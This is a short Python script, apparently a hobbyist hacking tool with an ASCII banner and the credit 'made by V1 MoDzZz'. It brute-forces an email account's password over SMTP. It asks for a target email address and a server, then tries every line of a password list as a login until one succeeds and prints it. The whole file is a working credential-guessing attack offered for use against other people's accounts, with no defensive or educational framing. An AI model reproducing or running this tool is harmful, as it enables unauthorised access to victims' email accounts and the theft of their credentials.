import smtplib
import sys



sys.ps1 = '\033[01;32m '
print(sys.ps1)
print('''
 ####### ######   #####   #####  
    #    #     # #     # #     # 
    #    #     #       #       # 
    #    ######   #####   #####  
    #    #   #         #       # 
    #    #    #  #     # #     # 
    #    #     #  #####   #####  
                                 
''')

print("connection successful")

print("made by V1 MoDzZz")

user = input("Enter the targets email address : ")

proto = input('Protocol : ')

smtpserver = smtplib.SMTP(proto, 587)
smtpserver.ehlo()
smtpserver.starttls()



pwfile = input("what is your password file directory : ")


pwfile = open(pwfile, "r")
print("Checking all passowrds in the list please hold on it will take some time depends on password list and password")

for password in pwfile:
    try:
        smtpserver.login(user, password)
        print("so the password is ", password)
        break
        
    except smtplib.SMTPAuthenticationError:
        print(password, "is not the password")
        
